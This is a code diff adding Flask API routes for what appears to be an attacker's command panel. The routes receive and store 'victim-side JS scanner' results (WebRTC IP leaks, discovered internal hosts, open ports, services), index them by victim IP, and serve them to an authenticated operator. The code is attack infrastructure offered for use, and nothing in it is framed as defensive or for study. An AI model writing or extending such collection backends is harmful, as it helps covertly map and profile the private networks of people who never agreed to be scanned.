@@ -59,3 +59,37 @@ def webrtc_leak():
         return jsonify({'status': 'received'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+
+
+# ---------------------------------------------------------------------------
+# P3.23: moved verbatim from app.py (webrtc list + network discovery)
+# ---------------------------------------------------------------------------
+@bp.route('/api/webrtc_leaks')
+def webrtc_leaks_list():
+    return jsonify({'leaks': STORE.webrtc_leaks_get()[-100:]})
+@bp.route('/api/network/receive', methods=['POST'])
+def api_network_receive():
+    """Receive network discovery data from victim-side JS scanner"""
+    data = request.json or {}
+    victim_ip = request.remote_addr
+    scan_type = data.get('scan_type', 'webrtc')
+    discovered = data.get('discovered_hosts', [])
+    ports = data.get('ports', [])
+    services = data.get('services', [])
+    raw = data.get('raw_data', {})
+    disc_id = db.save_network_discovery(victim_ip, scan_type, discovered, ports, services, raw)
+    return jsonify({'status': 'received', 'id': disc_id})
+@bp.route('/api/network/discoveries')
+def api_network_discoveries():
+    if 'IAm-logined' not in session:
+        return jsonify({'error': 'Not authenticated'}), 401
+    victim_ip = request.args.get('ip')
+    results = db.get_network_discoveries(victim_ip)
+    for r in results:
+        for field in ('discovered_hosts', 'ports', 'services', 'raw_data'):
+            if isinstance(r.get(field), str):
+                try:
+                    r[field] = json.loads(r[field])
+                except Exception:
+                    pass
+    return jsonify({'discoveries': results, 'total': len(results)})
